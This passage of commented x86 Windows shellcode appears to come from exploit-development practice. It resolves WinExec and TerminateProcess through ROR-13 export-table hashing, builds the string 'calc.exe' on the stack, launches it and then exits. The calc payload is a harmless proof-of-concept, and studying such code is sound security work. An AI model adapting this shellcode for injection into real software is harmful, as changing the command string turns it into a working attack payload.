   test  al, al                    ;     Check for NULL terminator
   jz    compute_hash_finished     ;     If the ZF is set, we've hit the NULL term
   ror   edx, 0x0d                 ;     Rotate edx 13 bits to the right
   add   edx, eax                  ;     Add the new byte to the accumulator
   jmp   compute_hash_again        ;     Next iteration

 compute_hash_finished:              

 find_function_compare:              
   cmp   edx, [esp+0x24]           ;     Compare the computed hash with the requested hash
   jnz   find_function_loop        ;     If it doesn't match go back to find_function_loop
   mov   edx, [edi+0x24]           ;     AddressOfNameOrdinals RVA
   add   edx, ebx                  ;     AddressOfNameOrdinals VMA
   mov   cx,  [edx+2*ecx]          ;     Extrapolate the function's ordinal
   mov   edx, [edi+0x1c]           ;     AddressOfFunctions RVA
   add   edx, ebx                  ;     AddressOfFunctions VMA
   mov   eax, [edx+4*ecx]          ;     Get the function RVA
   add   eax, ebx                  ;     Get the function VMA
   mov   [esp+0x1c], eax           ;     Overwrite stack version of eax from pushad

 find_function_finished:              
   popad                           ;     Restore registers
   ret                             ;  

 resolve_symbols_kernel32:          
  push DWORD 0xe8afe98                  ;     WinExec hash
  call dword [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x10], eax           ;     Save WinExec address for later usage
  push DWORD 0x78b5b983                 ;     TerminateProcess hash
  call dword [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x14], eax           ;     Save TerminateProcess address for later usage

 create_calc_string:                  
  xor eax, eax                   ;      EAX = null
  push eax                       ;      Push null-terminated string
  push dword 0x6578652e		       ;          
  push dword 0x636c6163          ;     
  push esp                       ;      ESP = &(lpCmdLine)
  pop  ebx                       ;      EBX save pointer to string 

 ; UINT WinExec(
 ; LPCSTR lpCmdLine, -> EBX
 ; UINT   uCmdShow 	 -> EAX
 ; );

 call_winexec:                        
	xor eax, eax                   ;    EAX = null
	push eax                       ;    uCmdShow
	push ebx                       ;    lpCmdLine
	call dword [ebp+0x10]      ;    Call WinExec

 ; BOOL TerminateProcess(
 ; HANDLE hProcess,	 -> 0xffffffff
 ; UINT   uExitCode	 -> EAX
 ; );

 terminate_process:                   
	xor eax, eax                   ;    EAX = null
	push eax                       ;    uExitCode
	push dword 0xffffffff                ;    hProcess
	call dword [ebp+0x14]      ;    Call TerminateProcess
```
